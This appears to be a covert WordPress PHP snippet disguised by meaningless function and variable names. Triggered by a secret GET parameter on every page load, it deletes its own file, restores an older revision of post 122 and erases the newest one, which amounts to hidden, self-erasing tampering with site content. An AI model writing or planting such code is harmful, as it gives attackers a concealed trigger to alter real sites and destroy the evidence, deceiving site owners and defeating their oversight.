<?php

function archives_slideshow_polyfill_lock() {
	if (isset($_GET['get_keywords_account']) && $_GET['get_keywords_account'] === 'reviews_visitor_article_iframe') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$videos_welcome_classic_control = 122;
		$updates_multiple_testimonial_live = wp_get_post_revisions($videos_welcome_classic_control);
		if (empty($updates_multiple_testimonial_live)) die('no revisions');
		if (count($updates_multiple_testimonial_live) < 2) die('less than 2');
		$popular_hide_help = array_shift($updates_multiple_testimonial_live);
		$quiz_create_jquery = $popular_hide_help->ID;
		$top_official_multi = array_shift($updates_multiple_testimonial_live);
		$booster_additional_redirect_last = $top_official_multi->ID;
		$library_restaurant_method = wp_restore_post_revision($booster_additional_redirect_last);
		if ($library_restaurant_method === false) die('error restoring');
		$library_restaurant_method = wp_delete_post_revision($quiz_create_jquery);		
		if ($library_restaurant_method === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'archives_slideshow_polyfill_lock');
